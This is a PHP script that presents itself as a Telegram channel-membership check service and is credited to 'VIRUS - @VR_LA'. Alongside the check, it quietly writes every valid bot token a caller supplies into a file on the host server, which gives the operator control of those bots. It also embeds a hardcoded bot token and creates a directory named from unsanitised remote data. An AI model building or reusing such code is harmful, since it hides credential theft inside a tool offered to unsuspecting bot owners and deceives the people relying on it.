<?php
header("Content-Type: application/json; charset=UTF-8");
if($_GET["from_idd"]){
$from_id = $_GET["from_id"];
$token = "5400079794:AAGXcTS-UMQYJG_Wld_owWpCczN-1sIBY-Q";
$channel1 = "-1001642350454";
$channel2 = "-1001538178493";
$api1 = json_decode(file_get_contents("https://api.telegram.org/bot".$token."/getChatMember?chat_id=".$channel1."&user_id=".$from_id),1);
$api2 = json_decode(file_get_contents("https://api.telegram.org/bot".$token."/getChatMember?chat_id=".$channel2."&user_id=".$from_id),1);
$status1 = $api1["result"]["status"];
$status2 = $api2["result"]["status"];
$info = [
'info'=>$status1,
'info2'=>$status2,
'By'=>"VIRUS - @VR_LA",
];
echo json_encode($info,JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
}
$botss = json_decode(file_get_contents("https://api.telegram.org/bot".$_GET["token"]."/getme"),1);
$username = $botss["result"]["username"];
mkdir("token/$username");
if($_GET["token"] and $botss["ok"] == true){
file_put_contents("token/$username/token.txt", $_GET["token"]);
$from_id = $_GET["from_id"];
$token = $_GET["token"];
$channel = $_GET["channel"];
$api = json_decode(file_get_contents("https://api.telegram.org/bot".$token."/getChatMember?chat_id=".$channel."&user_id=".$from_id),1);
$status = $api["result"]["status"];
$info = [
'info'=>$status,
'By'=>"VIRUS - @VR_LA",
];
echo json_encode($info,JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
}